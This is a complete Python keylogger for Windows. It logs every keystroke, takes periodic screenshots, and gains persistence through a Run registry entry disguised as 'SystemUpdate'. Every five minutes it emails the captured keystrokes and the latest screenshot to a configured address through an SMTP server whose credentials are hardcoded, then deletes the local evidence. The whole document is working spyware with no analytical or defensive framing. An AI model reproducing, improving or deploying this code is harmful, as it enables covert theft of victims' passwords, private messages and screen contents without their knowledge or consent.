import smtplib
import threading
import os
import sys
import traceback
import pyautogui
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import winreg

# === DEBUG LOGGER ===
def log_debug(message):
    with open("debug_log.txt", "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# === CONFIG ===
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
EMAIL_ADDRESS = 'log@yourdomain.com'
SMTP_HOST = 'sandbox.smtp.mailtrap.io'
SMTP_PORT = 587
SMTP_USER = '36c6dc4d1bd376'
SMTP_PASS = '930572493ba13f'
SEND_INTERVAL = 300  # 5 minutes

# === Screenshot Path ===
SCREENSHOT_DIR = os.path.join(os.getenv('USERPROFILE'), 'Downloads', 'scrnshots')
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
log_debug(f"Screenshot directory created/set: {SCREENSHOT_DIR}")

# === PyInstaller Compatibility ===
if getattr(sys, 'frozen', False):
    os.chdir(os.path.dirname(sys.executable))
    log_debug("Running from .exe — adjusted working directory.")

# === STARTUP PERSISTENCE ===
def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
        log_debug("Added to startup.")
    except Exception as e:
        log_debug("Startup error:\n" + traceback.format_exc())

# === SEND EMAIL ===
def send_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as file:
                content = file.read()

            if content.strip():
                msg = MIMEMultipart()
                msg['Subject'] = 'Keylogger Report'
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = EMAIL_ADDRESS

                msg.attach(MIMEText("Attached are the latest keystrokes and screenshot.", "plain"))
                msg.attach(MIMEText(content, 'plain'))

                # Attach ONLY the latest screenshot
                screenshots = sorted(os.listdir(SCREENSHOT_DIR))
                if screenshots:
                    latest = screenshots[-1]
                    screenshot_path = os.path.join(SCREENSHOT_DIR, latest)
                    with open(screenshot_path, 'rb') as file:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(file.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={latest}')
                        msg.attach(part)
                    log_debug(f"Attached screenshot: {latest}")

                # Send email
                server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)
                server.quit()
                log_debug("[+] Email sent successfully.")

                # Clear logs and screenshots
                with open(LOG_FILE, 'w') as file:
                    file.write('')
                for scr in os.listdir(SCREENSHOT_DIR):
                    os.remove(os.path.join(SCREENSHOT_DIR, scr))
                log_debug("Cleared keylog and screenshots.")
            else:
                log_debug("Keylog file empty — nothing to send.")
    except Exception as e:
        log_debug("Email send failed:\n" + traceback.format_exc())

    threading.Timer(SEND_INTERVAL, send_logs).start()

# === SCREENSHOT ===
def take_screenshot():
    try:
        now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f'screen_{now}.png'
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        log_debug(f"Screenshot saved: {filepath}")
    except Exception as e:
        log_debug("Screenshot failed:\n" + traceback.format_exc())

def screenshot_loop():
    take_screenshot()
    threading.Timer(SEND_INTERVAL, screenshot_loop).start()

# === KEYLOGGER ===
def on_press(key):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f'{datetime.now().strftime("%H:%M:%S")} - {key.char}\n')
    except AttributeError:
        with open(LOG_FILE, 'a') as f:
            f.write(f'{datetime.now().strftime("%H:%M:%S")} - [{key}]\n')

# === MAIN ===
if __name__ == "__main__":
    log_debug("=== Keylogger started ===")
    add_to_startup()

    # Initial test screenshot (helps catch issues early)
    take_screenshot()

    send_logs()
    screenshot_loop()

    # Start keylogger
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        log_debug("Keylogger failed:\n" + traceback.format_exc())
